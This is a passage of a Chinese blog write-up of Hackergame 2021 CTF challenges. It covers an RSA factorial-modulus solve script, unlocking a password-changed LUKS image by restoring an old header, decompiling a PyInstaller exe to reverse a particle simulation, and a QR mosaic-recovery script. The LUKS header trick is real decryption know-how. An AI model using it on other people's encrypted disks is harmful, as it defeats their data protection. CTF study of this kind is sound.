11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\ny = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n# (x-1)!mod x=x-1\n# (x-k-1)!mod x=(((x-k)!mod x) * invert(-k)) mod x\n\ndef get_p(x, y):\n    \"\"\"p = next_p(y! % x) where x is prime\"\"\"\n    r = x - 1\n    n = x - 1 - y\n    for i in range(1, n + 1):\n        r = (r * gmpy2.invert(- i, x)) % x\n\n    return sympy.nextprime(int(r))\n\np = get_p(x, y)\n\nvalue = [80096058210213458444437404275177554701604739094679033012396452382975889905967]\nfor _ in range(1, 10):\n    value.insert(0, sympy.prevprime(value[0]))\n\ne = 65537\nn = 1\nr = 1\nfor i in range(10):\n    n = n * value[i]\n    r = r * (value[i] - 1)\nvalue_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\nd = int(gmpy2.invert(e, r))\nq = sympy.nextprime(pow(value_q, d, n))\n\nc = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\nd = int(gmpy2.invert(e, (p - 1) * (q - 1)))\nm = pow(c, d, p * q)\nflag = int.to_bytes(m, 28, 'big')\nprint(flag)\n```\n\n这道题的第二种解法：如题目开头 [Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实](https://github.com/ustclug/hackergame2018-writeups/tree/master/official/RSA_of_Z#%E8%A7%A3%E6%B3%95-1)所说，在中科大少年班有着能够心算RSA的天才，相信这类巨佬应该也具备心算大整数阶乘的能力，所以只要找到一个这样的天才，让他帮你心算，即可轻松得到flag。\n\n\n---\n\n## 加密的 U 盘\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n这是一个关于 LUKS (Linux Unified Key Setup) 的故事。\n\n\n第一天\n\n\n小 T：「你要的随机过程的课件我帮你拷好了，在这个 U 盘里，LUKS 加密的密码是 suijiguocheng123123。」\n\n\n小 Z：「啊，你又搞了 Linux 文件系统加密，真拿你没办法。我现在不方便用 Linux，我直接把这块盘做成磁盘镜像文件再回去处理吧。」\n\n\n第二天\n\n\n小 Z：「谢谢你昨天帮我拷的课件。你每次都搞这个加密，它真的安全吗？」\n\n\n小 T：「当然了！你看，你还给我之后，我已经把这块盘的弱密码改掉了，现在是随机生成的强密码，这样除了我自己，世界上任何人都无法解密它了。」\n\n\n小 Z：「我可不信。」\n\n\n小 T：「你不信？你看，我现在往 U 盘里放一个 flag 文件，然后这个 U 盘就给你了，你绝对解密不出来这个文件的内容。当初搞 LUKS 的时候我可研究了好几天，班上可没人比我更懂加密！」\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/%E5%8A%A0%E5%AF%86%E7%9A%84%20U%20%E7%9B%98/src/lukspwd.zip)\n{% endnote %}\n{% endhideToggle %}\n这题又出现了没听说过的东西：LUKS。\n\n\n下载题目文件，发现有两个img文件：day1.img、day2.img。目的是挂载day2.img来获取flag。\n\n\n先用fdisk看一下day1.img的分区情况：\n\n```bash\nfdisk -l day1.img\n\nDisk day1.img: 20 MiB, 20971520 bytes, 40960 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: E1D1730D-1029-44A4-898B-FEBC77E7884F\n\nDevice     Start   End Sectors Size Type\nday1.img1   2048 40926   38879  19M Linux filesystem\n```\n\n把day1.img1分区dd出来并挂载到/mnt看看：\n\n```bash\ndd if=day1.img of=header1.dd bs=512 skip=2048\nsudo cryptsetup luksOpen header1.dd day1 #输入密码 suijiguocheng123123\nsudo mount /dev/mapper/day1 /mnt\nls /mnt\n\nlost+found  随机过程.txt\n```\n\n啊这，还真的是随机过程，我居然打开来仔细看了一遍，感慨随机过程白学了的同时并没有找到其他有用的信息（\n\n\n研究cryptsetup命令发现了一个东西：\n\n```bash\ncryptsetup luksHeaderRestore\n```\n\n由于前面研究了很长一段时间LUKS头部的meta data，感觉只要能把day2.img的头部信息恢复到day1.img的状态，可能就可以用day1的密钥解锁镜像了，不然题目告诉我day1的密码就真的一点用都没有，我是不信的。\n\n\n因此这个命令引起了我的注意。\n\n\n在前面的基础上简单操作了一下（先把前面的/mnt取消挂载）：\n\n```bash\ndd if=day2.img of=header2.dd bs=512 skip=2048\nsudo cryptsetup luksHeaderRestore header2.dd --header-backup-file header1.dd\n\nWARNING!\n========\nDevice header2.dd already contains LUKS2 header. Replacing header will destroy existing keyslots.\n\nAre you sure? (Type uppercase yes): YES\n\nsudo cryptsetup luksOpen header2.dd day2\n```\n\n输入suijiguocheng123123试了下，果然成功了，接下来挂载day2即可获取flag。\n\n```bash\nsudo mount /dev/mapper/day2 /mnt\ncat /mnt/flag.txt\n\nflag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key}\n```\n\n事实上，LUKS真正用于加密文件系统的密钥并非用户设置的密码，用户设置的密码只是用来给真正的密钥（master key）加密用的，因此修改密码并不会修改加密用的密钥，从而有了破解此题的理论可能性。\n\n\n---\n\n## Micro World\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n宇宙中某一片极其微小的区域里的粒子被一股神秘力量初始化设置成了 flag 的形状，程序忠实地记录了一段时间之后这片区域的粒子运动情况。\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/Micro%20World/src/microworld.exe)\n\n{% endnote %}\n{% endhideToggle %}\n下载文件，发现是个exe，于是跑去windows系统运行了一下，发现是很多粒子在乱飞，题目意思看上去是说，要找到这些粒子的初始状态（排列成flag形状）。\n\n\n由于是个逆向题，首先用IDA打开，胡乱看了一通代码，发现果然看不懂。随意看了一下String，发现一堆Py开头的变量，推测是Python打包的程序。因此谷歌“python exe逆向”，找到工具pyinstxtractor.py（v1.9），在Python3.8环境下运行：\n\n```bash\npython pyinstxtractor.py microworld.exe\n```\n\n拿到一个文件夹，其中有两个没有后缀的文件：2、struct。用16进制查看器打开struct和2两个文件，把struct文件的前16个字节复制到2文件的最前面，然后将2重命名为2.pyc。（如果你前面用的pyinstxtractor.py是2.0版本的，那么无需操作这一步，直接运行下面的umcompyle6就可以了。）\n\n\n使用uncompyle6（pip install uncompyle6）反编译2.pyc：\n\n```bash\nuncompyle6 2.pyc > 2.py\n```\n\n拿到一个未加混淆的py文件：\n\n```python\n# uncompyle6 version 3.7.4\n# Python bytecode 3.8 (3413)\n# Decompiled from: Python 3.7.11 (default, Jul 27 2021, 14:32:16) \n# [GCC 7.5.0]\n# Embedded file name: 2.py\nimport time, pygame, random, math\nWIDTH = 800\nHEIGHT = 480\nFPS = 30\nRADIUS = 6\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nRED = (255, 0, 0)\nGREEN = (0, 255, 0)\nBLUE = (0, 0, 255)\npygame.init()\npygame.mixer.init()\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption('Micro world')\nclock = pygame.time.Clock()\nrunning = True\ncount = 0\nlist_ = [\n (104.57999766036382, 294.30576115498934, 0.1577677901040423, 0.41776948474620357), (97.87091160071468, 284.0771467313936, -0.05370797410649919, -1.5117973702589511), (394.1386262922653, 342.409197651039, 1.257922260374631, -0.6461638773589035), (383.764164219779, 351.02042667556873, 0.20006041825672996, 0.6886413335669115),\n (180.44019240845162, 133.7535956479616, -1.2484762435639396, -0.24929662016190135), (184.78982911642964, 145.40211792122318, -0.0022636999589985274, 0.5513600856872762), (115.03335937165885, 300.9993063319222, -0.5676054221924623, -0.6695938101055833), (428.3301722808014, 85.83680504269783, -0.0513590947698387, 0.2619177140188991), (421.5916683285764, 72.17809124687787, 0.2014421765254144, -1.4100046681437837), (162.58901945971377, 126.99241616764206, 0.030293407742100736, -0.8004786559033131), (160.9895035322225, 145.70895141366148, 0.34929641702611086, 1.0244323100199488), (99.54962866775641, 349.46917135540673, 0.8725254958889044, 0.18026779894381553), (113.4935960089335, 350.07171367926867, 1.3948726673436584, -0.054645034381742424), (243.53937023444496, 324.4815163708293, 0.7754113027163299, -0.35104389069767705), (236.07107039080046, 336.93661006373446, 0.48878994205902065, 0.3668410462786823), (142.25100857351947, 107.18317281548164, 0.8769918696942771, 0.3381787797086514), (126.65532126550701, 101.44841747837386, -0.23643662821636835, -0.7474233162903591), (93.89796091125481, 337.69531331910224, 1.0011924240124088, 0.3786722871573705), (80.48068970171919, 325.1970583485235, -0.7399280117105376, -0.1701776000030069), (562.4548633698985, 293.8157173337281, 0.9232890949122534, -0.6707164772798287), (544.2230504332125, 298.5096170399827, -0.45781767619323493, 0.20143165105280758), (591.0728484545633, 384.0271820277358, -0.3546100658269741, -0.11818203300203947), (587.8300731972232, 397.21466538385005, 0.1658293862635661, 0.42343564083856233), (160.96290809954047, 113.1243147430774, 0.3297720052539864, -0.9088842057483848), (341.609111706211, 174.90102865131772, -0.6451128281395191, 0.6625764312805231), (361.89732768708996, 171.7398998209568, 0.9626383465113062, -0.45377732846689295), (413.2372099784884, 109.2059457838029, 0.06068110806079574, 0.7460129288950222), (428.03790114833487, 103.0981885607253, 0.7102816563423606, 0.5965135218875973), (632.823035103914, 183.41308729879773, 0.9426699419434019, -0.17948947163331008), (619.693443152725, 171.6281942118759, -0.4050225991049363, -0.3004630650084027), (234.93804029190275, 314.4850986917503, 0.6079647151190387, -0.3527147434952942), (388.84210326921414, 329.1140520966929, -0.25641606835531666, 0.013640064895390436), (431.54831561818656, 328.2835752571257, 0.0862740779218544, 0.30203328636401916), (449.4737324005318, 318.59090969779714, 0.8493162548457772, -0.39087008306977955), (414.9662287493531, 321.7992369591167, -0.38427287382474645, -0.8225562013945713), (393.14019608044197, 166.3219823104028, -0.8606903726780473, 0.44501048112586244),\n (407.74279750683405, 174.07932270043037, -0.41221110195676625, 0.5621672919603494), (459.79766287684146, 367.8798142900581, -0.013886373621122439, -0.3180180360181074), (481.3079661009345, 389.2929845754805, 1.308536261884114, 0.6279064260682542), (299.0319011022105, 142.56295134440845, 0.5129247847316193, 0.6861624164039957), (284.8757848267405, 115.44737423970206, -0.39395187391162256, -0.7247085199267874), (721.0242237005709, 208.11018311759165, 0.5031252275481168, 0.45273074175310746), (698.5559327045538, 206.46532762419102, -0.4253037092008059, -0.10234863067289382), (238.01728536837834, 96.94484935393817, -1.0004911938691854, -0.649305316642717), (231.42367571047265, 113.24222441346936, -1.0247825937879875, -0.17624171000468863), (219.78600179605175, 374.1104577170864, -0.6368728728325652, -0.17569384553335526), (246.11065722883504, 371.79606791842366, 0.5219343181987446, -0.3462866864847798), (61.288999430029705, 325.3049764118085, 0.06327048049117068, 0.43129466994014554), (44.508614390256625, 300.0898728637909, -0.6949149408422702, -0.6606674558084397), (444.7436476698611, 97.43495673585237, 0.0767541318435591, -0.2776251496223229), (744.2355976846196, 142.86962390689527, 0.9981335574540283, -0.24606523573449057), (722.4382189578434, 148.50423479439266, 0.17497076263720399, -0.184532590143744), (418.5327228664219, 136.72695351434712, 0.5475576395865829, -0.8913163462276698), (695.9021288583592, 180.5828160193858, -0.9488479900701872, -0.7148885273332122), (514.3530295181225, 176.69505705865964, 0.4250410294309581, 0.24872469962151272), (491.3217475016306, 192.06501755019133, -0.5852344731438237, 0.6683151007063167), (404.93366351040646, 355.33847789785887, -0.2208752264067056, 0.5785115096521176), (660.6042829909404, 388.98594646068375, -0.2802404219269444, -0.8854758825918975), (657.1412902684084, 422.0142602600062, -0.09955316106014461, 0.6262242796545058), (324.601539532362, 71.99880574130555, -0.44523640628825367, -0.7982939572849916), (313.7688791782026, 100.51158011600064, -0.8550429986673138, 0.23687636012864005), (463.05020279897207, 354.3841115016863, 0.5259364738387711, -0.030002820893658896), (307.8633146779248, 151.5952286725273, 0.6622908641009807, -0.03664136082024409), (398.41892028466214, 111.78772135693538, 0.11954324115479029, -0.8254277998217231), (381.45123257781245, 136.6036806395423, -0.6799079499520264, -0.08600175586428575), (292.6839863142225, 92.60685790044825, 0.536452531252875, -0.7140993636579337), (107.00966574475697, 373.9070654764243, -0.7010200558637464, -0.1381120246392485), (145.16889322345122, 365.860466913724, 0.5965222398714648, -0.5001275164663491), (353.3938458530145, 92.28564527857638, 0.27648661676701847, 0.4055937158607218), (332.6003342739462, 150.35292606144606, 0.16791054337808475, 0.19838069473157122), (333.2155442174266, 135.41367942003444, -0.1948746996045789, -0.8713050639597644), (341.7828985904844, 176.40085292375244, 0.15777998878645658, 0.45702848410002833), (352.9649338991208, 63.40320810353417, 0.31005939791813875, -0.35531540613337653), (558.759849975508, 335.82850463010334, -0.3751838713627865, 0.6972047893312435), (658.9879897953409, 243.4647341215956, -0.2407221233734072, -0.9276449712809698), (680.2245351443412, 296.75251078114536, 0.4337786026208906, 0.9727281158269319), (341.72634396514303, 378.7867598373575, -0.03596521226118493, 0.51167641447653), (697.0597317905844, 409.2588838533252, 0.9048830590914927, -0.4657488561253242), (665.1731546911783, 437.3925803649936, -0.007368744952089001, 0.3787660493964195), (67.00785464657952, 103.1274278061125, 0.03732794987331456, -0.5508360071810254), (105.96964960562794, 128.97178091353496, 0.8136907261343687, 0.4063622560568454), (105.07041437177854, 61.05750261646497, 0.26186719895475497, -0.5163887919827821), (68.49603305059723, 73.94521027290915, -0.7594061833112205, -0.7798070269292883), (71.34190872889897, 124.87773643827933, -0.4688181952259638, -0.5600838356192892), (64.27757202298889, 159.8496885573903, -0.6934232584078162, -0.042604127504053846), (70.57044794264237, 176.93801328964406, -0.4233167428650957, -0.11340691519836832), (144.63770817171127, 69.41378490162104, -0.08749228993661817, -0.28097092956958947), (137.8210753472867, 150.33804975066357, -0.191812024174572, 0.6051129537282753), (137.26460390655052, 180.16854638211603, -0.21242207753516196, 0.11735356970799926), (165.50112593068218, 175.5434604690403, 0.3148565159511876, -0.3132051678133363), (158.21970276683984, 160.0662466663162, -0.399270267894807, -0.47902790124753714), (162.68670402259963, 93.7322224457243, -0.9745665176814846, -0.9728806501583553), (200.74175804924195, 121.50562533623162, -0.6762311833614205, -0.2034953579173453), (224.47067029408507, 148.9360402550957, 0.46187667755869377, -0.22459110166312768), (249.5998504282539, 128.78709867759278, 0.8740685343797732, -0.6745519008298879), (222.1623163178933, 162.24461613732666, -0.40139569192986624, 0.04609689397505523), (270.1496673364134, 119.26292107574434, 0.44998767912644677, -0.8791510712687354), (251.7055547368385, 167.7628397486525, -0.9368313060430262, 0.6578829536537905), (275.1172494773191, 184.09798794704585, -0.5141759452844961, -0.033407853813111066), (265.9957830031348, 199.51750836889886, -0.25941544432835606, 0.056204013662934704), (282.07956665413514, 164.958740535395, 0.8918358020049804, -0.7422688690594414), (353.4402011639725, 114.78109493306745, 0.7570444875545246, -0.415515002478986), (356.5222794940665, 213.68778310329276, 0.6860103516321112, 0.9143623371590044), (330.49971249176855, 226.5949460000718, -0.6111217595640996, 0.873886888891541), (454.61901786077544, 150.71441166327446, 0.8747784392879676, 0.9153485801212855), (388.60627446909075, 197.93977442346403, -0.23680464929294276, 0.14591757123939741), (423.67540627845943, 205.2755085720821, -0.5305405082052022, 0.8620558730400902), (477.52821141998515, 197.94782386045253, 0.8714152377772004, -0.11304356072398081), (509.7764508897392, 142.38940000013736, -0.3416129300096671, 0.4959037037087939), (517.4542284218678, 157.00198576512298, -0.8720656140048659, 0.7778513246341929), (489.14570184081595, 143.71628106431027, -0.43904807996975315, 0.17467707645594244), (484.36624455679043, 162.18554614981508, -0.3197687201188777, 0.006872079622769922), (538.1915570784884, 186.90845701394394, 0.2663539658698997, 0.9595724819979277),\n (558.4402698588482, 151.2562488554182, 0.20149147625361707, -0.1756944868363639), (498.8936687068798, 219.16941966684988, -0.522456714559989, 0.747015543216671), (557.5264047150413, 194.47492406099926, 0.686163137594151, -0.13055836811114152), (572.2642293852141, 133.05544915189392, -0.36058409684388026, 0.18723885747756386),\n (593.233462901164, 148.90845332339745, 0.11975788522826214, -0.04042765468897547), (592.1067952919601, 200.97587238888386, -0.2553038780755985, 0.7398471255142076), (620.8001885800545, 156.51793210692475, -0.5999930155535687, 0.3525160039601669), (630.0497687231773, 138.21403356381515, -0.7018604176601002, 0.3042234653264848), (656.2600646659411, 156.841032404578, -0.9903679753354846, 0.7348530520214087), (711.2887269504378, 97.8513508705996, 0.3810639611272786, -0.8943944122000136), (738.7664844418454, 116.88118100970506, 0.6209809052535715, -0.41180811075166335), (703.8040510631283, 152.5920657076647, 0.511261150486223, -0.5706642330494665), (740.09107559372, 198.6981029696348, 0.5218916886562541, 0.1740038136901716), (657.6864804602145, 215.93482850112167, -0.9745747977698767, 0.034623277819314735), (71.54711083768379, 350.36060634700226, 0.6498929939882905, -0.6162738389999025),\n (150.9033697831391, 276.73234512286984, 0.9223470290051474, 0.582679448995163), (172.75073798985846, 238.05776406669546, 0.9907680736984741, -0.886749479011274), (166.14454393170783, 261.9146208279891, -0.10575763215896572, -0.04019922859299774), (135.8179319546022, 304.5167891568187, 0.51177525757786, 0.6117329317340197), (109.29600036825342, 324.14080376797784, -0.32237035673135206, -0.47626652711191975), (128.25054047146125, 342.5039087606924, 0.41668668412819376, -0.6480033792336315), (160.9435843133916, 336.7772890102673, 0.22013275234783625, 0.4732329263061923), (159.99063987213424, 357.3713520468878, 0.14780147674570876, -0.8751351093745308), (203.82463986148133, 294.85292265982395, 0.36387555042522823, -0.8943361977843205), (238.77834673828744, 257.8957469467245, 0.69549432364027, -0.966824187158376), (234.71098679446786, 302.43763534262735, 0.6189254368321369, -0.02082832064340412), (199.13592069493149, 350.92258754952445, -0.5134844187062317, -0.2621263870546515), (246.08239218788768, 387.5706266290919, 0.5215700810328909, -0.12701382855216137), (279.81163336690304, 310.1193743783627, -0.5995691345591287, 0.8192360880875091), (312.43826713316605, 326.3110183009928, 0.6088247086357645, -0.02551784070396379), (278.3124563204679, 346.2774946054354, -0.618057173316024, 0.23249980020133165), (309.0606334597058, 364.2832298989901, 0.5578012392483811, 0.34382332959224393),\n (277.86613144487796, 384.4110746203211, -0.5605136501896855, 0.422632393345197), (297.7963837815137, 417.4215462126431, 0.1776438437597616, 0.978575785653446), (308.64648313310744, 389.32195957645587, -0.8279080321071313, 0.048961465794687076), (332.9030266443413, 352.59935912758954, -0.9665545687281056, 0.614791078799594), (348.26013943242486, 314.11612768512305, -0.842217058058359, -0.032736011662137576), (360.3306887191309, 292.2383422919451, -0.7655300474395692, -0.32450584103905666), (396.9404109804546, 370.8911519658965, -0.15035514887206558, -0.04106844570751811), (400.104874692782, 411.57211198606, -0.1442639002673347, 0.761930073557795), (440.30114216085207, 361.3409051871098, 0.9000423022537898, -0.2836701782551865), (429.3543769941238, 341.9294444418788, 0.3094213701527606, -0.33594650215266264), (447.43603366759595, 277.2285471339229, 0.38651976546653843, -0.880424180225089), (481.7939322275633, 301.5421301772078, -0.15578028786801723, -0.09103221565894848), (496.05798504633856, 291.5141421831062, -0.0719264797652579, -0.09206880803313222), (509.5366997343411, 286.81707674748407, -0.16530741724662823, 0.14137321286975357), (512.6359971378648, 331.33312820778906, -0.7542223282272489, 0.9012269706588789), (565.2777793457861, 322.789250206497, -0.8786007649708629, 0.6588611187591347), (616.2993903993898, 307.1147976370016, 0.30738482960705515, 0.07832583840747809), (549.4707698926467, 355.7327131244734, -0.6862677817538163, 0.5086190046101378), (566.0048628120813, 359.0888370802809, -0.8146347106636107, 0.521808780751152), (603.0173174232779, 355.65724327656727, -0.22158083617492497, 0.09841641765061859), (627.8321653818715, 343.97419893606997, 0.4011913104396747, -0.9268815208862793), (537.4339433151019, 408.0628758894442, -0.9839280253666145, 0.5949213292386479), (640.8558916665046, 286.24303230003744, -0.30163364198134635, 0.3052974925939915), (693.3776564065166, 322.7209553086005, 0.6806539409820418, 0.8785539003185334), (677.9197897159304, 332.5251925812629, 0.1451773968863177, 0.42685898449123116), (715.7380915196851, 359.6720022622894, 0.8791885748031647, 0.9508148986033234), (654.241096201209, 350.8310224121308, -0.8058853258811696, 0.25300083007890595), (660.0062961624873, 367.58093595080226, -0.6293964384264055, 0.09559022040005982), (674.0852620040955, 376.20299215975325, -0.07091622207048798, -0.362852142231338)]\n\nclass Point:\n\n    def __init__(self, pos, vx, vy):\n        self.x, self.y = pos\n        self.vx = vx\n        self.vy = vy\n        self.flag = 1\n\n\ndef dotproduct(v1, v2):\n    return v1[0] * v2[0] + v1[1] * v2[1]\n\n\ndef checkcrush(point1, point2):\n    distance = math.sqrt((point1.x - point2.x) ** 2 + (point1.y - point2.y) ** 2)\n    a = (point1.vx - point2.vx) ** 2 + (point1.vy - point2.vy) ** 2\n    b = 2 * (point1.x - point2.x) * (point1.vx - point2.vx) + 2 * (point1.y - point2.y) * (point1.vy - point2.vy)\n    c = distance ** 2 - 4 * RADIUS ** 2\n    delta = b ** 2 - 4 * a * c\n    if delta < 0:\n        return\n    time = (-b - math.sqrt(delta)) / (2 * a)\n    if time > 0:\n        if time < 1:\n            return time\n    return\n\n\ndef get_new_point(time, point1, point2):\n    distance = math.sqrt((point1.x - point2.x) ** 2 + (point1.y - point2.y) ** 2)\n    standard_displacement = ((point2.x - point1.x) / distance, (point2.y - point1.y) / distance)\n    v_1 = (point1.vx, point1.vy)\n    v_2 = (point2.vx, point2.vy)\n    v_par_1 = dotproduct(standard_displacement, v_1)\n    v_par_2 = dotproduct(standard_displacement, v_2)\n    v_ver_1 = (point1.vx - v_par_1 * standard_displacement[0], point1.vy - v_par_1 * standard_displacement[1])\n    v_ver_2 = (point2.vx - v_par_2 * standard_displacement[0], point2.vy - v_par_2 * standard_displacement[1])\n    v_after_par_1 = v_par_2\n    v_after_par_2 = v_par_1\n    v_after_1 = (v_after_par_1 * standard_displacement[0] + v_ver_1[0], v_after_par_1 * standard_displacement[1] + v_ver_1[1])\n    v_after_2 = (v_after_par_2 * standard_displacement[0] + v_ver_2[0], v_after_par_2 * standard_displacement[1] + v_ver_2[1])\n    afterpos_1 = (point1.x + point1.vx * time + v_after_1[0] * (1 - time), point1.y + point1.vy * time + v_after_1[1] * (1 - time))\n    afterpos_2 = (point2.x + point2.vx * time + v_after_2[0] * (1 - time), point2.y + point2.vy * time + v_after_2[1] * (1 - time))\n    return (Point(afterpos_1, v_after_1[0], v_after_1[1]), Point(afterpos_2, v_after_2[0], v_after_2[1]))\n\n\ndef drawpoint(screen, list_):\n    for item in list_:\n        pygame.draw.circle(screen, BLUE, (round(item.x), round(item.y)), RADIUS, 3)\n\n\ndef next_pos_list(Pointlist):\n    pointlist = []\n    for i in range(len(Pointlist)):\n        for point in Pointlist[i + 1:]:\n            times = checkcrush(Pointlist[i], point)\n            if times != None:\n                a, b = get_new_point(times, Pointlist[i], point)\n                pointlist.extend([a, b])\n                Pointlist[i].flag = 0\n                point.flag = 0\n    else:\n        for item in Pointlist:\n            if item.flag != 0:\n                pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy))\n            for poi in pointlist:\n                poi.x = poi.x % WIDTH\n                poi.y = poi.y % HEIGHT\n        else:\n            return pointlist\n\n\nPointlist = []\nfor item in list_:\n    Pointlist.append(Point((item[0], item[1]), item[2], item[3]))\nelse:\n\n    def value(lis):\n        count = 0\n        for item in lis:\n            count = count + (item.x - round(item.x)) ** 2 + (item.y - round(item.y)) ** 2\n        else:\n            return count\n\n\n    while running:\n        clock.tick(FPS)\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                running = False\n        screen.fill(BLACK)\n        drawpoint(screen, Pointlist)\n        Pointlist = next_pos_list(Pointlist)\n        pygame.display.flip()\n\n    pygame.quit()\n# okay decompiling 2.pyc\n\n```\n\n容易读懂程序模拟了一堆粒子的运动，粒子之间有完全弹性碰撞。\n\n\n不过我一开始没注意缩进，踩了两个坑，uncompyle6在反编译时会出现一些缩进的错误，需要手动改一下，这题的文件好像有3个缩进错误的地方。\n\n\n改完缩进以后，将下面代码修改一下（在表示速度的量前面加个负号），运行程序，粒子即反向运动，拿个手机录屏，慢慢拖到能辨认flag的位置。\n\n```python\nPointlist = []\nfor item in list_:\n    # Pointlist.append(Point((item[0], item[1]), item[2], item[3]))\n    Pointlist.append(Point((item[0], item[1]), -item[2], -item[3]))\n```\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/35643ae21486b54ace35ce1248eb76c8.png)\n\n\n---\n\nflag{Rev3sEtiM^5}\n\n另外在赛后我又找到了一个pyc文件反编译工具：[python-decompile3](https://github.com/rocky/python-decompile3/)，用它对前面拿到的2.pyc进行反编译，则不会出现缩进的问题。\n\n## 马赛克\n\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n共享单车只剩下一辆，走近一看，果然是一辆二维码被坏人涂掉一大块的车，谁也骑不走。\n\n\n我今天还非就要把这个辆车骑走。\n\n\n于是你开始研究起来这个二维码。\n\n![](https://oss.fyz666.xyz/blogfiles/bmp/052790ec78fcec883208aa8069a5b30a.bmp)\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/%E9%A9%AC%E8%B5%9B%E5%85%8B/src/mosaic.zip)\n\n{% endnote %}\n{% endhideToggle %}\n反马赛克，试了一下炼丹，但是失败了。但分析生成代码，发现它是一个简单的均值池化马赛克，故其实有很多块是可以通过类似扫雷的思路完全确定的，大概只有中间的一些无法确定，但由于马赛克本身具有容错性，对无法确定的块随机选择也可以解出来，或者可以稍微写一下随机的策略，可以解的更快。解题代码如下：\n\n```python\nimport random\nfrom copy import deepcopy\nfrom pyzbar.pyzbar import decode\nimport numpy as np\nfrom itertools import combinations\nfrom PIL import Image\n\nX, Y = 103, 137     # 马赛克左上角位置(单位为像素)\nN = 20              # 马赛克块的数量（共N*N块）\nBOX_SIZE = 23       # 每个马赛克块的大小（边长，单位为像素）\nPIXEL_SIZE = 11     # 二维码每个块的大小（边长，单位为像素）\n\nimg = Image.open('https://oss.fyz666.xyz/blogfiles/bmp/052790ec78fcec883208aa8069a5b30a.bmp').convert('L')\nimg = np.array(img)\n\ndef fill(x, y, strict=True):\n    x1 = X + x * BOX_SIZE\n    y1 = Y + y * BOX_SIZE\n    W = np.array([11 - x1 % 11, 11, 1 + x1 % 11])\n    H = np.array([11 - y1 % 11, 11, 1 + y1 % 11])\n    mean = img[x1, y1]\n    areas, indexes = [], []\n    area = 0\n    for i, j in np.ndindex(3, 3):\n        if status[x1 // 11 + i][y1 // 11 + j] == 1:\n            area += W[i] * H[j] * result[x1 + i * 11, y1 + j * 11]\n        else:\n            areas.append(W[i] * H[j] * 255)\n            indexes.append((i, j))\n    output = match_sum(areas, area, mean, strict)\n    if output is False:\n        return\n    for id_ in output:\n        i, j = indexes[id_]\n        i, j = x1 // 11 + i, y1 // 11 + j\n        result[i * 11: i * 11 + 11, j * 11: j * 11 + 11] = 255\n    for i, j in np.ndindex(3, 3):\n        status[x1 // 11 + i][y1 // 11 + j] = 1\n\ndef match_sum(L, S, mean, strict=True):\n    avgs = np.array([abs((sum(pair) + S) // (23 * 23) - mean) for n in range(len(L) + 1) for pair in combinations(L, n)])\n    index = [pair for n in range(len(L) + 1) for pair in combinations(range(len(L)), n)]\n    mins = np.where(avgs.min() == avgs)[0]\n    if strict and len(mins) > 1 and avgs.min() < 1:\n        return False\n    return index[random.choice(mins)]\n\nresult = np.zeros((627, 627))\nstatus = np.zeros((57, 57))\nfor i, j in np.ndindex(57, 57):\n    if i * 11 < X or j * 11 < Y:\n        result[i * 11: i * 11 + 11, j * 11: j * 11 + 11] = img[i * 11, j * 11]\n        status[i, j] = 1\n    elif i * 11 + 10 > X + 20 * 23 or j * 11 + 10 > Y + 20 * 23:\n        result[i * 11: i * 11 + 11, j * 11: j * 11 + 11] = img[i * 11 + 10, j * 11 + 10]\n        status[i, j] = 1\nfor i in range(20):\n    for j in range(20):\n        fill(i, j)\n\nstatus_bak = deepcopy(status)\nresult_bak = deepcopy(result)\n\nwhile 1:\n    status = deepcopy(status_bak)\n    result = deepcopy(result_bak)\n    for i in range(20):\n        for j in range(20):\n            fill(i, j, False)\n    barcodes = decode(Image.fromarray(result))\n    for barcode in barcodes:\n        barcode_url = barcode.data.decode(\"utf-8\")\n        print(barcode_url)\n\n```\n\n虽然通过while 1不断尝试，但感觉几乎每次都能跑出来flag，很少有识别不出来的情况：\n\n![](https://oss.fyz666.xyz/blogfiles/png/b1d8a72faedef0842e9a468ad4055f7e.png)\n\n\n---\n\n## minecRaft\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\nkk 同学很喜欢玩 Minecraft，他最近收到了一张 MC 地图，地图里面有三盏灯，还有很多奇奇怪怪的压力板。\n\n\n但他发现这些灯好像不太符合 MC 电磁学（Red stone），你能帮他把灯全部点亮吗？\n\n\n注：本题解法与原版 Minecraft 游戏无关。\n\n\n补充说明：flag 花括号内为让三盏灯全部点亮的最短的输入序列。例如，如果踩踏压力板输入的最短的序列为 abc，则答案为 flag{abc}。\n\n{% endnote %}\n{% endhideToggle 